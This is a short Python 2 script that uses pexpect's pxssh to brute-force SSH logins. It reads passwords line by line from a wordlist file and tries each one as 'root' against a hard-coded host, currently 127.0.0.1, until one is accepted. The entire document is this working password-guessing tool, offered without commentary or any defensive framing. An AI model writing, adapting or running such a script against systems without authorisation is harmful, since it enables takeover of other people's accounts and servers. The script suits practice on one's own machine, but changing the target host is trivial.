from pexpect import pxssh
import time

Found = False

def connect(host, user, password):
	global Found
	try:
		s = pxssh.pxssh()
		s.login(host, user, password)
		print '[+] Password Found: ' + password
		Found = True
	except Exception, e:
		if 'password refused' in str(e):
			print "wrong : " + password
		else:
			print "wait 5 seconds ..."
			time.sleep(5)
			connect(host, user, password)

def main():
	filee = open("dictt.txt",'r')
	for line in filee:
		if Found == False:
			password = line.strip('\n')
			connect("127.0.0.1","root",password)
		else:
			break
	
main()
